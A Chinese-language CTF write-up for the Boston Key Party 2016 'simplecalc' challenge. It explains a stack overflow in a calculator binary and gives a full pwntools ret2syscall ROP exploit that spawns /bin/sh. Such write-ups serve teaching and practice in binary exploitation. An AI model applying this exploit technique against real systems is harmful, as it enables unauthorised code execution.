---
!!! warning
    The current page still doesn't have a translation for this language.

    You can read it through google translate.

    Besides, you can also help to translate it: [Contributing](https://ctf-wiki.org/en/contribute/before-contributing/). 


title: nightmare 2.9.Boston Key Part 2016 simplecalc-wp
date: 2023-08-14 08:44:24
tags:
- CTF
- pwn
- BKP2016
- nightmare
- stack 
- ret2syscall
categories:
- pwn-wp
---

[相关资源](https://github.com/guyinatuxedo/nightmare/tree/master/modules/07-bof_static/bkp16_simplecalc)  

## 文件分析

```python
$ checksec simplecalc
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

```sh
$ ./simplecalc  
    |#------------------------------------#|
    |         Something Calculator         |
    |#------------------------------------#|

Expected number of calculations: 50
Options Menu:
 [1] Addition.
 [2] Subtraction.
 [3] Multiplication.
 [4] Division.
 [5] Save and Exit.
=> 1
Integer x: 1
Integer y: 1
Do you really need help calculating such small numbers?
Shame on you... Bye
```

## 代码分析
![img](https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2023/08/14/BKP2016-simplecalc-wp/0x1.png?raw=true)  

1. 可以看到首先获取输入`v20`，然后进行`v20`次计算操作，计算结果存入数组`v21`中
2. 当选择选项5时，会将`v21`中的内容全部拷贝到`v18`中，明显此处存在栈溢出切溢出内容我们可以通过计算结果来控制

## 攻击方法
该文件是静态链接的，但是没有找到库函数`system`，并且开启了栈不可执行   
`ALT+T` 查找`syscall` 发现存在，则可以利用系统调用来实现攻击    
`rdi -> '/bin/sh'字符串指针`   
`rsi -> 0`  
`rdx -> 0`  
`rax -> 0x3b`   

1. 由`ROPgadget`我们可以获取到可用pop指令地址
2. 需要将'/bin/sh'写入到数据段中（写在栈上不知道地址，数据段地址固定）  
    * `ROPgadget --binary simplecalc --only "mov|ret"`
    * 刚好有 `0x0000000000400aba : mov qword ptr [rdi], rdx ; ret`
    * 则只要构造pop链将目标地址置入`rdi`，将'/bin/sh'置入`rdx`再调用即可
3. 最后构造pop链执行`syscall`  

## exp
```python
from pwn import *
import sys

context(os='linux', log_level='debug')

mode = ''
if len(sys.argv) > 1:
    mode = sys.argv[1]

proc = process("./simplecalc")

def s(x): proc.send(x)
def sl(x): return proc.sendline(x)
def sd(x): return proc.send(x)
def sla(x, y): return proc.sendlineafter(x, y)
def sa(x, y): return proc.sendafter(x, y)
def ru(x): return proc.recvuntil(x)
def rc(): return proc.recv()
def rl(): return proc.recvline()
def li(con): return log.info(con)
def ls(con): return log.success(con)
def pi(): return proc.interactive()
def pcls(): return proc.close()
def ga(): return u64(ru(b'\x7f')[-6:].ljust(8, b'\x00'))

def addSingle(x):
	proc.recvuntil("=> ")
	proc.sendline("1")
	proc.recvuntil("Integer x: ")
	proc.sendline("100")
	proc.recvuntil("Integer y: ")
	proc.sendline(str(x - 100))  # 注意代码要求任意参与运算的数字都要大于0x27


def add(z): 
    # 注意数组中每个位置为int(dword型)，
    # 64位栈内基本块为qword，因此要分高低32位分别存入
	x = z & 0xffffffff
	y = ((z & 0xffffffff00000000) >> 32) 
	addSingle(x)
	addSingle(y)

gscript = '''
    b main
    b * 0x401545
    c
'''
if mode == '-d':
    gdb.attach(proc, gdbscript=gscript)

rax_ret = 0x44db34
rdx_ret = 0x437a85
rdi_ret = 0x401b73
rsi_ret = 0x401c87
syscall = 0x400488
dest = 0x6C4480
mv_rdx2_prdi = 0x400aba


# rdi_ret + dest + rdx_ret + b'/bin/sh\x00' + mv_rdx2_prdi
# rsi_ret + p64(0) + rdx_ret + p64(0) + rax_ret + p64(0x3b) + syscall
sla(b'calculations: ', b'100')
for i in range(9):
    # 填满当前栈空间，注意填到v21时最好填0，
    # 因为代码会对v21进行free操作，填其他的可能触发段错误
    add(0)       

add(rdi_ret)  
add(dest)
add(rdx_ret)
add(0x0068732f6e69622f)   # /bin/sh

add(mv_rdx2_prdi)
add(rsi_ret)
add(0)
add(rdx_ret)
add(0)
add(rax_ret)
add(0x3b)
add(syscall)

sla(b'=> ', b'5')

pi()
pause()

```